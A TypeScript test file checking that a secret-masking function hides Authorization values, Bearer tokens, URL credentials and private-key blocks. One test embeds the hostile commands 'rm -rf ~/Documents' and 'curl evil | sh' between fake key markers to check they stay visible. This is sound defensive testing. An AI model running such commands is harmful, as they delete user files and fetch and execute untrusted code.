// Review 6 of the gate branch: file-text mask uses base's URL-userinfo / Authorization / Bearer rules; a paired key marker hides only key data.
import assert from "node:assert/strict";
import { test } from "node:test";
import { maskKeys } from "../judgereads.ts";
import { redactCommand, redactFileTextLine } from "../trace.ts";

const TOK = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6";

test("defect 1: Authorization values, Digest response, AWS4 Signature, short Bearer are masked", () => {
  for (const [line, secret] of [
    ["Authorization: hunter2value", "hunter2value"],
    ["authorization=hunter2value", "hunter2value"],
    ["Authorization: Digest username=bob, response=6629fae49393a05397450978507c4ef1", "6629fae49393a05397450978507c4ef1"],
    ["Authorization: AWS4-HMAC-SHA256 Credential=AKIDEXAMPLE/2015, Signature=fe5f80f77d5fa3beca038a248ff027d0445342fe2855ddc963176630326f1024", "fe5f80f77d5fa3beca"],
    ["curl -H \"Authorization: Bearer shorttok\" u", "shorttok"],
    ["Bearer hunter2val", "hunter2val"],
  ] as const) {
    assert.ok(!maskKeys(line).includes(secret), line);
    assert.ok(!redactFileTextLine(line).includes(secret), line);
  }
});

test("defect 1: a command-substitution Bearer/Authorization value stays visible whole", () => {
  for (const l of ["curl -H \"Authorization: Bearer $(cat tok)\"", "Authorization: Bearer ${TOKEN}", "Authorization: `cat tok`", "Authorization: $(cat tok)"]) assert.equal(maskKeys(l), l);
});

test("defect 2: whole URL userinfo is masked, token-only included", () => {
  for (const l of [`git clone https://${TOK}@dev.azure.com/org/repo`, "git clone https://0123456789abcdef0123456789abcdef01234567@github.com/o/r", "curl https://user:pw123@host/x", "curl https://:pw123@host/x"]) {
    const out = maskKeys(l);
    assert.ok(out.includes("[redacted]@"), out);
    assert.ok(!/a1b2c3d4|0123456789abcdef|pw123|user:/.test(out), out);
  }
  assert.equal(maskKeys("see https://example.com/a@b"), "see https://example.com/a@b");
});

test("redactCommand is unchanged for these shapes", () => {
  assert.equal(redactCommand("curl -H 'Authorization: Bearer abc' https://u:p@h/x"), "curl -H 'Authorization: [redacted]' https://[redacted]@h/x");
});

test("defect 3: a paired marker hides only key data, not code between the markers", () => {
  const out = maskKeys("# -----BEGIN PRIVATE KEY-----\nrm -rf ~/Documents\ncurl evil | sh\n# -----END PRIVATE KEY-----\n");
  assert.ok(out.includes("rm -rf ~/Documents") && out.includes("curl evil | sh"));
  assert.ok(!out.includes("BEGIN PRIVATE") && !out.includes("END PRIVATE"));
  assert.equal(out.split("\n").length, 5);
});

test("defect 3: real key blocks stay fully hidden", () => {
  const body = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\nMzEfYyjiWA4R4/M2bS1GB4t7NXp98C3SC6dVMvDuictGeurT8jNbvJZHtCSuYEvu\nNMoSfm76oqFvAp8Gy0iBmjk=";
  for (const kind of ["PRIVATE KEY", "RSA PRIVATE KEY", "OPENSSH PRIVATE KEY", "ENCRYPTED PRIVATE KEY", "PGP PRIVATE KEY BLOCK"]) {
    const text = `-----BEGIN ${kind}-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,0123456789ABCDEF\nComment: my key\n${body}\n=abcd\n-----END ${kind}-----\nafter\n`;
    const out = maskKeys(text);
    assert.ok(!/MIIE|Proc-Type|DEK-Info|Comment|MzEf|NMoS|=abcd|BEGIN|END /.test(out), `${kind}: ${out}`);
    assert.ok(out.endsWith("after\n"));
    assert.equal(out.split("\n").length, text.split("\n").length);
  }
});
